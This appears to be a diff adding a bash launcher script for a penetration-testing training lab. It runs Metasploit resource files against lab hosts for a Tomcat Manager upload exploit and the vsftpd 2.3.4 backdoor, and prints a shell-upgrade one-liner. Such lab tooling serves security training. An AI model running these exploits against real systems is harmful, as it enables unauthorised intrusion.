@@ -1,0 +1,33 @@
+#!/bin/bash
+# Quick exploit launcher for P3N73S7 L4B
+# Usage: pwn <target>
+#
+# After you've done a lab manually, use this to see it automated.
+
+SCRIPTS_DIR="$(dirname "$0")"
+
+case "$1" in
+    tomcat)
+        echo "[*] Pwning Tomcat Manager (172.20.0.19)..."
+        echo "[*] You'll get a shell - type 'id' to confirm access"
+        echo "[*] Upgrade prompt with: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+        echo ""
+        msfconsole -q -r "$SCRIPTS_DIR/pwn-tomcat.rc"
+        ;;
+    vsftpd)
+        echo "[*] Pwning vsftpd backdoor (172.20.0.15)..."
+        msfconsole -q -r "$SCRIPTS_DIR/pwn-vsftpd.rc"
+        ;;
+    list|--list|-l)
+        echo "Available targets:"
+        echo "  tomcat  - Tomcat Manager upload (172.20.0.19)"
+        echo "  vsftpd  - vsftpd 2.3.4 backdoor (172.20.0.15)"
+        echo ""
+        echo "Usage: pwn <target>"
+        ;;
+    *)
+        echo "Usage: pwn <target>"
+        echo "Run 'pwn list' to see available targets"
+        exit 1
+        ;;
+esac
